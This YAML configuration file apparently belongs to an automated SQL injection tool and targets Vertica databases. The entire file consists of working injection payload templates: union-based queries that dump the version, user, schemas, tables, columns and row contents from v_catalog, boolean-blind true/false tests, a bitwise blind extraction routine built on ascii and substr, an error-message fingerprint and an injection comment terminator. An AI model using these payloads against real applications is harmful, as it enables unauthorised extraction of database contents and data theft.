vendor: 
resource: 
 info: |
  select
      '${ENCLOSE_VALUE_SQL}'
      || version()
      || '${ENCLOSE_VALUE_SQL}'
      || current_database()
      || '${ENCLOSE_VALUE_SQL}'
      || user
      || '${TRAIL_SQL}'
      
 schema: 
  database: |
   select 
       rr
       ||'${TRAIL_SQL}'
       r
   from (
       select distinct
           '${ENCLOSE_VALUE_SQL}'
           || table_schema
           || '${SEPARATOR_QTE_SQL}'
           || '0'
           || '${ENCLOSE_VALUE_SQL}'
           rr
       from v_catalog.tables
       order by rr
       {limit}
   )x
   
  table: |
   select 
       rr
       ||'${TRAIL_SQL}'
       r
   from (
       select distinct
           '${ENCLOSE_VALUE_SQL}'
           || table_name
           || '${SEPARATOR_QTE_SQL}'
           || '0'
           || '${ENCLOSE_VALUE_SQL}'
           rr
       from v_catalog.tables
       where TABLE_SCHEMA = '${DATABASE}'
       order by rr
       {limit}
   )x
   
  column: |
   select 
       rr
       ||'${TRAIL_SQL}'
       r
   from (
       select distinct
           '${ENCLOSE_VALUE_SQL}'
           || column_name
           || '${SEPARATOR_QTE_SQL}'
           || '0'
           || '${ENCLOSE_VALUE_SQL}'
           rr
       from v_catalog.columns
       where columns.TABLE_SCHEMA = '${DATABASE}'
       and columns.TABLE_name = '${TABLE}'
       order by rr
       {limit}
   )x
   
  row: 
   query: |
    select 
        rr
        ||'${TRAIL_SQL}'
        r
    from (
        select distinct
            '${ENCLOSE_VALUE_SQL}'
            || (${FIELDS})
            || '${SEPARATOR_QTE_SQL}'
            || '0'
            || '${ENCLOSE_VALUE_SQL}'
            rr
        from ${DATABASE}.${TABLE}
        order by rr
        {limit}
    )x
   fields: 
    field: |
     trim(
         coalesce(
             ${FIELD}::varchar,
             ''
         )
     )
    concat: "|| '%7f' ||"
    
strategy: 
 configuration: 
  slidingWindow: |
   select
       /**
        * If reach end of string (${LEAD}i) then NULLIF nullifies the result
        */
       '${LEAD}'
       || NULLIF(
           substr(
               (${INJECTION}),
               ${INDEX},
               65536
           ),
           '${TRAIL_SQL}'
       )
  limit: limit 1 offset ${LIMIT}
  failsafe: (1337${INDICE}7330%2b1)::varchar
  calibrator: repeat(chr(35), 1024)
  limitBoundary: 0
  endingComment: --+-
  fingerprint: 
   errorMessage: 
    - Vertica Analytics
    
 normal: 
  indices: union select ${INDICES}
  capacity: (select '${LEAD}' || ${INDICE} || ${CALIBRATOR})
  orderBy: order by 1337
  
 boolean: 
  test: 
   falses: 
    - true = false
    - true %21= true
    - false %21= false
    - 1 = 2
    - 1 %21= 1
    - 2 %21= 2
   trues: 
    - true = true
    - false = false
    - true %21= false
    - 1 = 1
    - 2 = 2
    - 1 %21= 2
   initialization: 0%2b1 = 1
   bit: |
    /**
     * true bit return bit, false bit return 0
     * 8 & 8 = 8, 8 & 4 = 0
     */
    0 != (
        ascii(
            substr(
                (${INJECTION}),
                ${INDEX},
                1
            )
        ) %26 ${BIT}
    )
   length: char_length((${INJECTION})) > ${INDEX}
   
  blind: and ${TEST}